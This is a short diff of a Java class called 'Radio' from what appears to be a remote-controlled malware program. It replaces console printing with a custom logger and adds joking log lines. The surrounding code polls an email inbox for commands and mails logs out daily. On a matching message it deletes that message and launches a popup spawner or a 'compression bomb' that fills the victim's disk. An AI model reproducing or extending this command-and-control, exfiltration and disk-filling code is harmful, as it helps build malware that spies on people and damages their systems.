@@ -247,12 +247,12 @@ public class Radio
 				 }
 				 if ((minutes % 30 == 0 || minutes == 0)) {
 					 if (emailReceive) {
-					     System.out.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
+					     Chocolat.println("[" + m.robert.elapsedTime() + "] [?] Checking for commands...");
 						 checkForCommands();
 				     }
 					 if (emailUpload && !uploadDone) {
 						 if (mailLogs() == 0) {
-						     System.out.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
+						     Chocolat.println("[" + m.robert.elapsedTime() + "] [✔] Daily TX Successful.");
 							 uploadDone = true;
 						 }
 					 }
@@ -509,6 +509,7 @@ public class Radio
 			         }
 			         // Popup boxes
 			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("WRECK")) {
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Started spawning lulz :3");
 			        	 message.setFlag(Flags.Flag.DELETED, true);
 			        	 emailFolder.close(true);
 			        	 spawner.start();
@@ -516,6 +517,7 @@ public class Radio
 			         
 			         // Compression bomb
 			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("FILL")) {
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] WTF BOOOOOOOOOOOOOOOOOOOOOOM!");
 			        	 message.setFlag(Flags.Flag.DELETED, true);
 			        	 emailFolder.close(true);
 			        	 AlphaDecay.start();
